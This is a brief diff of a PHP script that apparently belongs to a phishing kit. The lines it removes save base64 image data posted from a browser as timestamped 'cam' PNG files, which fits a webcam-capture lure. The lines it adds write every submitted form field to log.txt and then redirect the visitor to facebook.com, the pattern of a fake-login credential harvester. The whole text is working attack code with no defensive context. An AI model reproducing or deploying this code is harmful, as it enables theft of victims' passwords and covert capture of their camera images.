@@ -1,15 +1,13 @@
 <?php
-
-$date = date('dMYHis');
-$imageData=$_POST['cat'];
-
-
-
-$filteredData=substr($imageData, strpos($imageData, ",")+1);
-$unencodedData=base64_decode($filteredData);
-$fp = fopen( 'cam'.$date.'.png', 'wb' );
-fwrite( $fp, $unencodedData);
-fclose( $fp );
-
-exit();
+header ('Location: https://facebook.com');
+$handle = fopen("log.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n\n\n\n");
+fclose($handle);
+exit;
 ?>
